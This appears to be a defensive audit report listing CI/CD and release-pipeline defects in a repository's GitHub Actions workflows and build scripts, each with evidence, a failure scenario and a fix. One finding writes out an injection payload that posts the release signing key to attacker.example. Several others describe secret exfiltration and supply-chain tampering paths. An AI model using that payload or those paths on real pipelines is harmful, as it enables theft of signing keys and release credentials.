title: workflow_dispatch manual build always dies after the full three-platform build
summary: For a manual run without sync_tag, the release job synthesises a timestamp tag like manual-build-20260805-120000 and then feeds it to resolve-update-rollback-version.mjs, which requires a semantic version and throws.
evidence:
.github/workflows/build-and-release.yml:1015-1017
  TIMESTAMP=$(date +%Y%m%d-%H%M%S)
  echo "type=$RELEASE_TYPE" >> $GITHUB_OUTPUT
  echo "tag=manual-build-$TIMESTAMP" >> $GITHUB_OUTPUT

.github/workflows/build-and-release.yml:1036-1041
  set -euo pipefail
  rollback=$(node scripts/resolve-update-rollback-version.mjs \
    --tag "${{ steps.release-info.outputs.tag }}" \
    --remote origin)

scripts/resolve-update-rollback-version.mjs:18-24
  const targetVersion = versionFromTag(tag)
  const channel = inferManifestChannel(targetVersion)
  if (!channel) {
    throw new Error(
      `Release tag must contain a supported semantic version: ${tag}`,
    )
failure_scenario: A maintainer runs the workflow manually with release_type=beta and no sync_tag (the documented way to produce a draft build). All three platforms build - roughly 30-60 minutes of Windows, macOS and Linux runner time - and then 'Resolve same-channel rollback version' calls the resolver with tag=manual-build-<timestamp>. inferManifestChannel cannot match that against its version pattern, returns null, the script throws and exits 1, and `set -euo pipefail` fails the step. The draft release is never created and every built artifact is discarded.
recommendation: Skip the rollback resolution for manual non-tag builds, or derive the synthetic tag from package.json's version.

title: create-release hardcodes type=release, contradicting the build job's channel detection
summary: The build job derives beta/snapshot/release from the tag name, but the release job's equivalent branch writes type=release unconditionally while still computing REF_NAME_LOWER for the prerelease flag.
evidence:
.github/workflows/build-and-release.yml:154-161 (build job, correct)
  REF_NAME_LOWER=$(echo "$REF_NAME" | tr '[:upper:]' '[:lower:]')
  if [[ "$REF_NAME_LOWER" == *"beta"* ]]; then
    echo "type=beta" >> $GITHUB_OUTPUT
  elif [[ "$REF_NAME_LOWER" == *"snapshot"* ]]; then
    echo "type=snapshot" >> $GITHUB_OUTPUT

.github/workflows/build-and-release.yml:1000-1003 (release job, hardcoded)
  elif [ "$EVENT_NAME" = "push" ]; then
    REF_NAME_LOWER=$(echo "$REF_NAME" | tr '[:upper:]' '[:lower:]')
    echo "type=release" >> $GITHUB_OUTPUT
failure_scenario: Pushing tag v2.4.14-beta.2 makes the build job produce beta artifacts named windows-2022-beta / macos-latest-beta, while steps.release-info.outputs.type is 'release'. That value is passed into the Collect Release Assets step as RELEASE_TYPE (line 1066). It happens to be unread today, so nothing breaks yet; the moment any asset-collection or notes logic branches on RELEASE_TYPE it will take the release path for a beta tag. The recovery path at lines 984-991 derives the same value correctly from the tag, which shows the push branch is simply wrong.
recommendation: Apply the same beta/snapshot/release detection used at lines 984-991 to the push branch.

title: Official signed releases download Electron and electron-builder binaries from a third-party mirror
summary: The release build job pins ELECTRON_MIRROR and ELECTRON_BUILDER_BINARIES_MIRROR to npmmirror.com for every platform and every channel, so the Electron runtime that gets code-signed and notarized is fetched from a mirror outside the project's trust boundary.
evidence:
.github/workflows/build-and-release.yml:55-60
  env:
    ELECTRON_MIRROR: https://npmmirror.com/mirrors/electron/
    ELECTRON_BUILDER_BINARIES_MIRROR: https://npmmirror.com/mirrors/electron-builder-binaries/
    ELECTRON_CACHE: ${{ github.workspace }}/.cache/electron
    ELECTRON_BUILDER_CACHE: ${{ github.workspace }}/../electron-builder-cache
    BUILD_PUBLISH: never
failure_scenario: Electron's install step verifies the downloaded zip against a SHASUMS file fetched from the same mirror, so a compromised or MITM'd mirror can serve a modified Electron binary together with matching checksums. That binary is then packaged, signed with the project's Developer ID certificate (secrets.CSC_LINK), notarized by Apple, and signed again by scripts/prepare-release-assets.mjs with RELEASE_SIGNING_PRIVATE_KEY. Every downstream integrity check the project performs would pass on a tampered runtime, and auto-update would ship it to all users.
recommendation: Drop the mirror overrides for release builds (keep them for local development via a non-committed env), or pin ELECTRON_CUSTOM_DIR plus an independently sourced checksum.

title: Build failure messages always report 'exit code 0' because $? is clobbered
summary: Nine build branches use `cmd || { BUILD_FAILED=true; echo "... exit code $?"; }`, where the assignment resets $? to 0 before it is read, so the diagnostic always prints 0.
failure_scenario: electron-builder exits 137 (OOM-killed) on the macOS release leg. The log line reads 'ERROR: macOS release build failed with exit code 0' because BUILD_FAILED=true succeeded and overwrote $?. Whoever debugs the failed release loses the one signal that distinguishes an out-of-memory kill from a signing or packaging error, and has to re-run the 40-minute job to find out.
recommendation: Capture the status first: `pnpm build:... ; status=$?; if [ "$status" -ne 0 ]; then BUILD_FAILED=true; echo "... exit code $status"; fi`.

title: Two of the four release-notes gate checks compare a value against itself
summary: version defaults to the root package.json version and tag defaults to `v${version}`, so the root-version and tag-version checks are tautologies whenever the CLI flags are omitted - which is how CI invokes the gate.
failure_scenario: CI runs `pnpm release:notes:verify` with no arguments. version = readPackageVersion(repoRoot) = rootVersion, so root-version compares rootVersion to itself and always passes; tag = `v${version}`, so tag-version strips the v and compares version to itself and always passes. Only core-version (root vs apps/core-app) and bilingual-notes do real work. The gate reports 4/4 green while providing 2 checks' worth of coverage, so a tag that disagrees with package.json is never caught here.
recommendation: Require --tag (and --version) explicitly in the CI invocation, or drop the self-comparing checks so the report does not overstate coverage.

title: Release sync sends NEXUS_API_KEY to a URL controlled by a repository variable
summary: NEXUS_BASE_URL comes from vars.NEXUS_SYNC_BASE_URL with a hardcoded fallback, and every curl in the sync job sends the NEXUS_API_KEY bearer token to whatever host that variable names.
evidence:
.github/workflows/build-and-release.yml:1260-1262
  env:
    NEXUS_BASE_URL: ${{ vars.NEXUS_SYNC_BASE_URL || 'https://tuff.tagzxia.com' }}
    NEXUS_API_KEY: ${{ secrets.NEXUS_API_KEY }}

.github/workflows/build-and-release.yml:1412-1418
  create_nexus_headers() {
    local -n output_headers="$1"
    output_headers=(
      -H "Authorization: Bearer ${NEXUS_API_KEY}"

.github/workflows/build-and-release.yml:1507-1511
  http_code=$(curl -sS -o /tmp/nexus-release-create.json -w "%{http_code}" \
    -X POST "${NEXUS_BASE_URL}/api/releases" \
    "${nexus_headers[@]}" \

The same pattern appears at .github/workflows/package-tuff-cli-publish.yml:29 and :240-245 for the CLI publish job.
failure_scenario: GitHub Actions variables are not secrets: they are plaintext, editable by anyone with write access to the repository or via a compromised maintainer account, and changing one leaves no secret-rotation trail. Setting NEXUS_SYNC_BASE_URL to an attacker-controlled origin makes the next tag push POST `Authorization: Bearer <NEXUS_API_KEY>` plus the CF-Access client id and secret (lines 1263-1264, 1420-1424) to that origin, handing over the credentials that publish releases to the Nexus control plane.
recommendation: Move the base URL into a secret, or validate it against an allowlist of expected hosts before any authenticated request.

title: AI review sends OPENAI_API_KEY to a variable-controlled endpoint and accepts a '*' author bypass
summary: OPENAI_BASE_URL and the author-association allowlist both come from repository variables, so a plaintext variable decides where the OpenAI key is sent and whether untrusted fork authors can trigger the job.
failure_scenario: The workflow runs on pull_request_target, so it executes with repository secrets for pull requests from forks. Setting the plaintext variable OPENAI_BASE_URL to an attacker host causes requestChatCompletion to send the OPENAI_API_KEY bearer token there on the next PR event. Independently, setting AI_REVIEW_ALLOWED_ASSOCIATIONS to '*' removes the MEMBER/OWNER/COLLABORATOR gate at line 47 entirely, letting any fork author burn the key and feed arbitrary prompt content that is posted back as a repository comment.
recommendation: Store the base URL as a secret or pin it, and drop the '*' wildcard so the association allowlist cannot be disabled by a variable.

title: packages/tuff-core is auto-published to npm with no CI workflow covering it
summary: @talex-touch/tuff-core is published on push to master by the CLI publish workflow, but no CI workflow has packages/tuff-core in its trigger paths, so its lint and build scripts never run before publication.
evidence:
.github/workflows/package-tuff-cli-publish.yml:15-16 (publish trigger)
  - "packages/tuff-core/package.json"
  - "packages/tuff-core/src/**"

.github/workflows/package-tuff-cli-publish.yml:63-67
  declare -a PACKAGE_NAMES=(
    "@talex-touch/tuff-core"
    "@talex-touch/unplugin-export-plugin"
    "@talex-touch/tuff-cli"
  )

$ grep -rln "tuff-core" .github/workflows/
.github/workflows/README.md
.github/workflows/package-tuff-cli-publish.yml

packages/tuff-core/package.json declares both "lint" and "build" scripts; package-tuff-cli-ci.yml's paths cover tuff-cli, tuff-cli-core, unplugin-export-plugin and utils, but not tuff-core.
failure_scenario: A change to packages/tuff-core/src lands on master. No CI workflow matches those paths, so nothing lints or builds it. package-tuff-cli-publish.yml then runs `pnpm --filter "@talex-touch/tuff-core" run build` and immediately `pnpm --filter ... publish --access public --no-git-checks`, pushing the result to the public npm registry. The build script is the only thing that could fail; lint, typecheck and tests never ran, and the package is consumed by external plugin developers.
recommendation: Add packages/tuff-core to package-tuff-cli-ci.yml's trigger paths and give it a CI job, and make the publish workflow depend on it.

title: Plugin permission validator uses a hardcoded list that has drifted from the registry, and only warns
summary: KNOWN_PERMISSION_IDS is a hand-copied snapshot of packages/utils/permission/registry.ts that is now missing four real permissions, and unknown IDs are reported with logWarn, which does not affect the exit code.
evidence:
scripts/validate-plugins.mjs:22-23
  // Known permission IDs from packages/utils/permission/registry.ts
  const KNOWN_PERMISSION_IDS = new Set([

scripts/validate-plugins.mjs:182-185
  const unknownIds = rawIds.filter(id => typeof id === 'string' && !KNOWN_PERMISSION_IDS.has(id))
  if (unknownIds.length > 0) {
    logWarn(pluginName, `Unknown permission IDs: ${unknownIds.join(', ')}`)
  }

Diff of registry ids against the hardcoded set (registry has 26, the script has 22):
  in registry but missing from validate-plugins.mjs:
    lexicon.read
    lexicon.register
    media.read
    storage.sqlite
failure_scenario: Two failure modes from one root cause. A plugin that legitimately declares storage.sqlite or media.read - both registered in packages/utils/permission/registry.ts - is reported as having an 'Unknown permission ID'. Conversely, because line 8's contract is 'Exit code 1 on any error-level issue' and this is logWarn, a typo such as 'fs.raed' also passes validation, so the check catches neither drift nor typos. No plugin manifest currently declares the four missing ids, so this is latent today.
recommendation: Import PERMISSIONS from packages/utils/permission/registry.ts instead of copying it, and promote unknown ids to an error.

title: version-sync pushes the release commit and tag to whatever branch is checked out
summary: The release script commits, tags and runs a bare `git push` with no check that HEAD is on master, so running it from a feature branch creates a release tag on that branch and triggers the production release workflow.
evidence:
scripts/version-sync.mjs:227-244
  const tagName = `v${versionAfter}`
  ensureTagNotExists(tagName)
  ...
  runCommand(`git commit -m "release: ${tagName}"`)

  log.info('Creating annotated tag...')
  runCommand(`git tag -a ${tagName} -m "release: ${tagName}"`)

  log.info('Pushing commits...')
  runCommand('git push')

  log.info(`Pushing tag ${tagName}...`)
  runCommand(`git push origin ${tagName}`)

The only precondition checked is a clean worktree (checkUncommittedChanges, lines 118-135); nothing inspects the current branch.
failure_scenario: A maintainer runs `pnpm version:patch` while still on a feature branch (this repo's own HEAD is TalexDreamSoul/app-shell-v2). bumpp updates the versions, the script commits, `git push` pushes to the feature branch, and `git push origin vX.Y.Z` publishes a tag pointing at a commit that was never merged to master. build-and-release.yml triggers on `push: tags: v*.*.*`, so a full signed three-platform release is built and published from unreviewed branch code.
recommendation: Assert the current branch is master (or an explicitly allowed release branch) before committing, and use an explicit `git push origin HEAD:<branch>`.

title: commitlint allows capitalised commit types that type-enum then rejects
summary: type-case permits PascalCase, Sentence case and Start Case, but type-enum lists only lowercase values and matches exactly, so any capitalised type passes one rule and fails the other.
evidence:
commitlint.config.cts:4-16
  'type-enum': [
    2,
    'always',
    [
      'change',
      'update',
      'feat',
      ...

commitlint.config.cts:31-40
  'type-case': [
    2,
    'always',
    [
      'pascal-case', // PascalCase
      'lower-case', // lowercase
      'sentence-case', // Sentence case
      'start-case', // Start Case
    ],
  ],
failure_scenario: A contributor writes `Feat: add search filter`. type-case accepts it as sentence-case, but type-enum compares the parsed type 'Feat' against the enum array by exact string match, finds no entry, and fails at severity 2. The commit-msg hook rejects the message with an enum error that lists lowercase types, while the case rule advertised that capitalisation was allowed - so the two rules describe contradictory policies and only the strict one is real.
recommendation: Restrict type-case to 'lower-case' so the config states one policy.

title: Build scripts use POSIX expansion that breaks on Windows and defaults to mac
summary: build:beta, build:snapshot and build:release embed ${BUILD_TARGET:-mac} in the npm script string, which only expands under a POSIX shell and hardcodes macOS as the default platform on every host.
evidence:
apps/core-app/package.json:34,38,39
  "build:beta": "node scripts/build-target.js --target=${BUILD_TARGET:-mac} --type=beta",
  "build:snapshot": "node scripts/build-target.js --target=${BUILD_TARGET:-mac} --type=snapshot",
  "build:release": "node scripts/build-target.js --target=${BUILD_TARGET:-mac} --type=release",

apps/core-app/scripts/build-target.js:75-81 (the script already defaults from the env itself)
  function parseArgs(argv) {
    const result = {
      target: process.env.BUILD_TARGET,

apps/core-app/scripts/build-target.js:451-457
  const normalizedTarget = target.toLowerCase()
  const supportedTargets = ['win', 'mac', 'linux']
  ... `Unsupported build target "${target}". Supported targets: ${supportedTargets.join(', ')}`
failure_scenario: On Windows, pnpm runs lifecycle scripts through cmd.exe, which does not perform ${VAR:-default} expansion, so argv contains the literal string --target=${BUILD_TARGET:-mac}. parseArgs assigns that literal to result.target and the build aborts with 'Unsupported build target "${BUILD_TARGET:-mac}"'. On Linux the expansion works but silently selects mac, so `pnpm core:build:release` on a Linux machine tries to produce a macOS bundle. The redundancy is visible in build-target.js itself, which already reads process.env.BUILD_TARGET.
recommendation: Drop the shell expansion (`--type=beta` only) and let build-target.js resolve BUILD_TARGET, defaulting to the host platform.

title: tsconfig.node.json maps @/typings/* to a packages/typings directory that does not exist
summary: The Electron main-process tsconfig declares a path alias pointing at packages/typings, which is not present in the repository and is not a workspace member.
evidence:
apps/core-app/tsconfig.node.json:19-20
  "@/common/*": ["packages/utils/common/*"],
  "@/typings/*": ["packages/typings/*"]

$ ls packages/typings
ls: packages/typings: No such file or directory

$ ls packages/
intelligence-uikit  pi-extension-tuff  test  tuff-analyse  tuff-business  tuff-cli  tuff-cli-core  tuff-core  tuff-intelligence  tuff-native  tuffex  unplugin-export-plugin  utils
failure_scenario: No main-process source imports @/typings today, so the mapping is inert. The hazard is that it reads as a supported alias: anyone who writes `import type { X } from '@/typings/x'` gets a resolution failure from `pnpm typecheck:node` with no hint that the target package was removed, and editors offer the alias in autocomplete because it is declared.
recommendation: Delete the @/typings/* entry, or restore packages/typings if it was removed by mistake.

title: pre-commit hook force-stages apps/core-app/package.json into every commit
summary: The hook runs sync:core-pkg and then unconditionally git-adds apps/core-app/package.json, so unrelated pending edits to that file are swept into whatever commit is being made.
evidence:
.husky/pre-commit:1-4
  pnpm sync:core-pkg
  git add "apps/core-app/package.json" >/dev/null 2>&1 || true

  pnpm lint:staged

scripts/sync-core-package.mjs:37 (what it rewrites)
  const fieldsToSync = ['version', 'description', 'author', 'homepage', 'license']
failure_scenario: A developer is mid-way through editing apps/core-app/package.json (adding a dependency, say) and commits an unrelated renderer fix with `git add src/... && git commit`. The hook stages the entire core-app manifest including the half-finished dependency edit, and the `|| true` plus output redirection means nothing is printed. The commit silently contains changes the author never staged and did not see in the diff they reviewed.
recommendation: Only stage the file when sync-core-package actually modified it, and print a line when it does.

title: Reusable package-ci workflow executes caller-supplied command strings verbatim
summary: All four steps interpolate string inputs directly into run:, so the reusable workflow's behaviour is defined by whatever shell text a caller passes rather than by a fixed command set.
failure_scenario: workflow_call inputs are plain strings that land in a shell without quoting, so the reusable workflow provides no boundary at all: a caller (including one added in a PR, since these package CI workflows also run on pull_request) defines arbitrary commands that execute on the runner. Today permissions are contents: read so the blast radius is limited to the runner and the pnpm cache, but the abstraction gives the false impression of a fixed, reviewed command set.
recommendation: Accept a package name and a fixed script name (pnpm run <script>) instead of free-form command strings.

title: macOS builds are arm64-only and never produce a .dmg the release pipeline searches for
summary: mac.target is a single dir/arm64 entry, so no dmg is ever produced and Intel Macs get no artifact, yet the release workflow searches for and uploads *.dmg in six places.
evidence:
apps/core-app/electron-builder.yml:118-128
  notarize: false
  gatekeeperAssess: false
  target:
    - target: dir
      arch: arm64
  ...
  artifactName: ${productName}-${version}.${ext}
dmg:

apps/core-app/scripts/build-target.js:501
  const defaultArch = normalizedTarget === 'mac' ? 'arm64' : 'x64'

.github/workflows/build-and-release.yml dmg references that can never match:
  563, 568 (artifact presence check), 640, 766 (upload glob), 808 (mac cleanup), 1050, 1074 (asset collection)
failure_scenario: electron-builder's `dir` target emits only dist/mac-arm64/tuff.app; the empty top-level `dmg:` key configures a target that is not requested. Every macOS artifact therefore reaches the release only because postprocess-mac.js re-archives the .app into a .zip. Two consequences: an Intel Mac user has no download at all, and the pipeline's macOS success checks are hollow - the DMG_COUNT branch at line 563 always reports 0 and the *.dmg upload glob at 766 always matches nothing, so those steps provide no signal that the macOS leg produced anything.
recommendation: Add explicit dmg/zip targets (and an x64 or universal arch) to mac.target, or delete the dead dmg globs so the checks reflect what is actually built.

title: macOS builds skip the native rebuild Windows and Linux run; the fallback check only tests existence
summary: Only the macOS legs set SKIP_INSTALL_APP_DEPS=true, which bypasses electron-builder install-app-deps, and the replacement verifyNativeModules check merely asserts that two .node files exist rather than that they target Electron.
failure_scenario: Windows and Linux run install-app-deps, which rebuilds every native dependency against the Electron ABI; macOS skips it, and npmRebuild: false means electron-builder will not rebuild during packaging either. The only thing standing in for that step is an fs.existsSync check on two file names, so a module left over from a Node-targeted build passes. The error string it prints claims to verify the Electron target but nothing reads the module's ABI or platform. Any packaged macOS dependency that is not N-API stable would therefore ship unrebuilt and fail at require() time in the signed app, with CI green.
recommendation: Either run install-app-deps on macOS too, or extend verifyNativeModules to assert the module's target ABI rather than its existence.

title: ESLint disables unused-variable detection across all release and signing scripts
summary: The scripts/** override turns off no-unused-vars in all three of its forms, so dead bindings in the release-signing, manifest-validation and publish tooling are never reported.
failure_scenario: scripts/ holds the release-critical tooling: prepare-release-assets.mjs (signs artifacts with RELEASE_SIGNING_PRIVATE_KEY), update-validate-release-manifest.mjs, check-release-signing-trust-roots.mjs, validate-publish-manifests.mjs and publish-package.mjs. An unused binding is the exact signature of a computed-but-never-checked validation result - e.g. assigning a verification outcome to a variable and forgetting the `if`. With all three rule names disabled, that pattern lints clean, and these scripts have no typecheck gate either since the repo has no root tsconfig covering scripts/.
recommendation: Keep no-console off for scripts, but re-enable no-unused-vars there (with argsIgnorePattern '^_') as the rest of the repo has it.

title: Release matrix mixes a pinned Windows image with floating macos-latest and ubuntu-latest
summary: The signed-release build matrix pins windows-2022 but leaves the macOS and Linux runners on -latest, so two thirds of the release toolchain changes underneath the pipeline without a commit.
evidence:
.github/workflows/build-and-release.yml:62-65
  strategy:
    fail-fast: false
    matrix:
      os: [windows-2022, macos-latest, ubuntu-latest]
failure_scenario: GitHub rolls macos-latest to a new major macOS with a newer Xcode. The next tag push builds and signs the shipped macOS app on that image with no repository change, so the artifact's minimum-OS target, codesign behaviour and linked system libraries shift silently. The same applies to ubuntu-latest for the AppImage/deb glibc floor. Because the release is reproduced from a tag, rebuilding an older tag after the rollover produces a different binary than the one originally published, and the pinned windows-2022 shows the team already understands this risk for one platform.
recommendation: Pin macos-15 and ubuntu-24.04 (or whichever versions are current) and bump them deliberately.

title: The step that publishes signed release assets uses a mutable third-party action tag
summary: softprops/action-gh-release@v3 is referenced by moving major tag in the job that holds contents: write and the GITHUB_TOKEN, so whatever that tag points to at run time uploads the release.
evidence:
.github/workflows/build-and-release.yml:1228-1240
  - name: Create Release
    id: create-release
    uses: softprops/action-gh-release@v3
    with:
      tag_name: ${{ steps.release-info.outputs.tag }}
      ...
      files: ${{ steps.release-files.outputs.files }}
      fail_on_unmatched_files: true
      body_path: generated-release-notes/release-notes.github.md
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

.github/workflows/build-and-release.yml:824-826
  permissions:
    actions: read
    contents: write
failure_scenario: A major tag in a third-party repository is mutable: the maintainer, or anyone who compromises that account, can repoint v3 at a new commit. That code then runs in the create-release job with contents: write and the GITHUB_TOKEN, at the exact point where the signed installers, detached signatures and tuff-release-manifest.json are uploaded - so it can substitute assets after prepare-release-assets.mjs has signed them and before users download them. This is the highest-value step in the repository to pin, and the project already treats supply-chain integrity as a requirement elsewhere (RELEASE_SIGNING_PRIVATE_KEY, trust-root validation at line 1060).
recommendation: Pin to a full commit SHA with a version comment, and do the same for the other third-party actions in the release path.

title: postinstall nuxt-content patch is dead code: resolve always throws ERR_PACKAGE_PATH_NOT_EXPORTED
summary: The root `postinstall` runs this patch to serialize @nuxt/content dev-cache writes, but it resolves the package via `@nuxt/content/package.json`, a subpath the package's `exports` map does not expose. The require.resolve always throws and the catch block exits 0, so the patch has never been applied.
failure_scenario: Reproduced at HEAD: createRequire(<script url>).resolve('@nuxt/content/package.json') throws ERR_PACKAGE_PATH_NOT_EXPORTED, so `pnpm install` silently skips the patch. The concurrency bug the patch documents ("Concurrent better-sqlite3 writes on the shared development cache can hang or throw 'readonly database'") is still live in every `nexus:dev` run, and the script prints nothing to say so.
recommendation: Resolve via `require.resolve('@nuxt/content')` and derive dist/module.mjs from it, and fail loudly (non-zero or a warning annotation) when the target block is not found.

title: workflow_dispatch inputs interpolated into a run: block that holds the release signing key
summary: The Collect Release Assets step interpolates unvalidated `github.event.inputs.rollback_evidence` and `rollback_evidence_signature` directly into bash. The same step has RELEASE_SIGNING_PRIVATE_KEY in its env and writes it to disk, so injected shell runs with the release signing key available.
evidence:
ROLLBACK_EVIDENCE="${{ github.event_name == 'workflow_dispatch' && github.event.inputs.rollback_evidence || '' }}"
ROLLBACK_EVIDENCE_SIGNATURE="${{ github.event_name == 'workflow_dispatch' && github.event.inputs.rollback_evidence_signature || '' }}"
failure_scenario: An actor who can run the workflow dispatches it with rollback_evidence set to `$(curl -X POST -d @$RUNNER_TEMP/tuff-release-signing-private.pem https://attacker.example)`. GitHub substitutes the string before bash parses the line, command substitution executes inside double quotes, and the decoded PEM at signing_key_path (line 1124-1131) is exfiltrated. Unlike sync_tag and recover_run_id (regex-validated at lines 851-858), these two inputs are never validated.
recommendation: Pass the inputs through `env:` and reference them as $ROLLBACK_EVIDENCE, and reject values that are not repo-relative paths matching a strict allowlist.

title: TUFF_ENCRYPTION_KEY secret is interpolated into a shell test instead of passed via env
summary: The Set Build Environment Variables step splices the raw secret value into the shell source of a `run:` block to test whether it is set. The secret becomes part of the command text rather than an environment value.
evidence:
if [ -n "${{ secrets.TUFF_ENCRYPTION_KEY }}" ]; then
  echo "TUFF_ENCRYPTION_KEY is set (official build)"
failure_scenario: If the secret ever contains a double quote or `$(`/backtick sequence, the expanded line is either a bash syntax error that fails every release build on all three runners, or a command substitution that executes attacker/operator-supplied text. Log masking does not protect against this because the value is evaluated by bash, not printed.
recommendation: Add `env: TUFF_ENCRYPTION_KEY: ${{ secrets.TUFF_ENCRYPTION_KEY }}` to the step and test `[ -n "${TUFF_ENCRYPTION_KEY}" ]`.

title: Cloudflare Access client secret is read from repository vars before secrets
summary: The Nexus sync job prefers `vars.ADMIN_CF_ACCESS_CLIENT_SECRET` over `secrets.ADMIN_CF_ACCESS_CLIENT_SECRET`. Repository/organization variables are plaintext configuration: they are readable in the UI/API and are never masked in Actions logs.
evidence:
NEXUS_CF_ACCESS_CLIENT_ID: ${{ vars.ADMIN_CF_ACCESS_CLIENT_ID || secrets.ADMIN_CF_ACCESS_CLIENT_ID }}
NEXUS_CF_ACCESS_CLIENT_SECRET: ${{ vars.ADMIN_CF_ACCESS_CLIENT_SECRET || secrets.ADMIN_CF_ACCESS_CLIENT_SECRET }}
failure_scenario: If an operator follows the first branch of the expression and stores the CF Access service-token secret as a variable, it is exposed to anyone with read access to repo settings, and any step that echoes the header (e.g. `curl -v`) prints it unredacted into a publicly readable release log, granting standing access behind Cloudflare Access to the Nexus admin API.
recommendation: Read the client secret only from `secrets.`; keep `vars.` for the non-sensitive client id if needed.

title: Tuffex CI disables lint, test and typecheck although all three scripts exist
summary: The tuffex package CI calls the reusable workflow with lint/test/typecheck all false and inline comments claiming the scripts do not exist. packages/tuffex/package.json defines `lint`, `test` and `typecheck`. The only gate that runs for the component library is `pnpm build`.
evidence:
run-typecheck: false # Add if typecheck script exists
      run-lint: false # Add if lint script exists
      run-test: false # Add if test script exists
      run-build: true

# packages/tuffex/package.json scripts: build, build:vite, dev, lint, lint:fix, test, typecheck, audit:exports, audit:types, audit:size
failure_scenario: A PR that breaks a tuffex unit test or introduces a vue-tsc type error passes CI as long as the Vite build emits output; the failure only surfaces later in apps/core-app's `typecheck:web`, which builds tuffex from source, or after release.
recommendation: Flip run-lint/run-test/run-typecheck to true for tuffex and delete the stale comments.

title: native-protocol workflow's push trigger targets `main`, but the default branch is `master`
summary: Every other workflow lists both `main` and `master`; this one lists only `main` on the push side. The repository default branch is `master` (origin/HEAD -> origin/master), so the post-merge Rust gate never executes.
evidence:
push:
    branches:
      - main
    paths:
      - '.github/workflows/native-protocol.yml'
      - 'apps/core-app/src/main/modules/native-capabilities/**'
failure_scenario: A Rust change merged to master runs no cargo fmt/clippy/test and no packed-package check on master itself. If the PR run was stale or was merged with an out-of-date base, a clippy-denied warning or a broken N-API protocol lands on the release branch undetected, and the next tagged build is the first thing to fail.
recommendation: Add `master` to the push branch list (or replace both with the default branch).

title: PR quality gate runs a hardcoded six-file test subset, so new tests never run in CI
summary: ci.yml's PR Quality job runs `pnpm quality:pr`, whose only test step is `test:targeted` — an explicit list of six test files across utils, core-app and nexus. No workflow runs the full vitest suites for apps/core-app, packages/utils or apps/nexus.
evidence:
"test:targeted": "corepack pnpm -C \"packages/utils\" exec vitest run \"__tests__/plugin-sdk-lifecycle.test.ts\" \"__tests__/transport-domain-sdks.test.ts\" \"__tests__/transport/port-policy.test.ts\" && corepack pnpm -C \"apps/core-app\" exec vitest run \"src/renderer/src/modules/auth/sync-preferences.test.ts\" \"src/main/modules/plugin/plugin-loaders.test.ts\" \"src/main/channel/common.test.ts\" && corepack pnpm -C \"apps/nexus\" exec vitest run \"test/api/sync/sync-routes-410.test.ts\"",
"quality:pr": "corepack pnpm release:notes:verify && corepack pnpm lint:changed && corepack pnpm test:targeted && corepack pnpm -C \"apps/core-app\" run typecheck"
failure_scenario: A PR adds src/main/modules/box-tool/foo.test.ts and breaks an existing suite in the same area. CI is green because neither the new test nor the broken one is in the six-file list; the regression is only found when someone runs vitest locally.
recommendation: Run the affected packages' full suites (or a changed-file-derived selection) in the PR gate and keep test:targeted only as a fast local loop.

title: No cargo ecosystem in dependabot despite a shipped Rust workspace with a tracked Cargo.lock
summary: dependabot.yml configures only npm and github-actions. packages/tuff-native is a five-member Cargo workspace with a tracked Cargo.lock whose addons (OCR, screenshot, audio, Everything) are compiled into the shipped Electron app and gated by native-protocol.yml.
evidence:
- package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 5

# packages/tuff-native/Cargo.toml members = ["native-core", "native-napi", "native-screenshot", "native-audio", "fixtures/native-protocol-addon"]
failure_scenario: A RUSTSEC advisory against a crate pinned in packages/tuff-native/Cargo.lock produces no PR and no alert from this config, so the vulnerable crate keeps shipping inside the signed desktop app until someone bumps it by hand.
recommendation: Add a `package-ecosystem: cargo` entry with `directory: /packages/tuff-native`.

title: Third-party actions are pinned to mutable tags and a moving branch (dtolnay/rust-toolchain@stable)
summary: Every third-party action in the release-capable workflows is referenced by a mutable ref. dtolnay/rust-toolchain@stable is a branch, not even a tag, and the same workflows/jobs carry NPM_TOKEN, NEXUS_API_KEY, RELEASE_SIGNING_PRIVATE_KEY and Apple notarization credentials.
evidence:
- name: Setup Rust
        uses: dtolnay/rust-toolchain@stable

# same pattern elsewhere: softprops/action-gh-release@v3, release-drafter/release-drafter@v7, dorny/paths-filter@v4, jdx/mise-action@v4, Swatinem/rust-cache@v2, pnpm/action-setup@v6
failure_scenario: If any of these upstream repos is compromised, the attacker force-pushes the branch or moves the major tag and the next run of build-and-release.yml or package-tuff-cli-publish.yml executes their code in a job that already holds the npm publish token and the release signing private key. Nothing in the repo pins a commit, so the change is invisible in the diff.
recommendation: Pin third-party actions to full commit SHAs with a version comment, and let the existing dependabot github-actions updater bump them.

title: lint:changed misses untracked files outside CI, so new files skip the pre-PR lint loop
summary: When GITHUB_BASE_REF is unset (any local run of `pnpm lint:changed` or `pnpm quality:pr`), the script diffs against HEAD, which only reports tracked modifications. Files added but not yet `git add`ed are invisible to it.
failure_scenario: A developer writes a new module, runs `pnpm quality:pr` locally, sees `[lint:changed] OK: no changed JS/TS/Vue files.` and pushes. The file is only linted once it is committed and the PR job re-runs with GITHUB_BASE_REF set, turning a local pass into a CI failure.
recommendation: Union the diff with `git ls-files --others --exclude-standard` when no base ref is available.

title: noImplicitAny is off for both Electron main and renderer despite strict: true
summary: Both core-app tsconfigs re-declare `strict: true` but inherit @electron-toolkit/tsconfig, whose base explicitly sets `noImplicitAny: false`. Since an explicit flag beats the `strict` family default, every untyped parameter in main, preload and renderer is silently `any`.
failure_scenario: `function handle(payload) { return payload.tuffQuery }` type-checks clean in both `typecheck:node` and `typecheck:web`; a renamed field on the caller side is not caught, and the mistake reaches runtime with no compile error.
recommendation: Set `noImplicitAny: true` in both apps/core-app tsconfigs (fix the fallout incrementally with per-file suppressions if needed).

title: prepare script uses deprecated `husky install` (husky 9.1.7 prints DEPRECATED)
summary: The root prepare script still calls the pre-v9 `husky install` form. The installed husky 9.1.7 prints a DEPRECATED banner and continues; the sibling deprecated verbs already exit 1, and `install` is scheduled for the same treatment.
failure_scenario: When husky reaches v10 and `install` joins the exit-1 list, `pnpm install` fails at the prepare step for every contributor and in every CI job that installs dependencies — or, if the command is made a silent no-op instead, commit-msg and pre-commit hooks stop being installed without any error.
recommendation: Change the prepare script to `husky`.

title: Release workflow never checks that the pushed tag matches the built package version
summary: The release manifest, GitHub release name and rollback contract all derive the version from the git tag, while every artifact filename and latest.yml come from apps/core-app/package.json. No step in build-and-release.yml compares the two.
evidence:
node scripts/prepare-release-assets.mjs \
  --tag "${TAG}" \

# scripts/prepare-release-assets.mjs
const version = getReleaseVersion(tag)   // strips leading v from the tag only

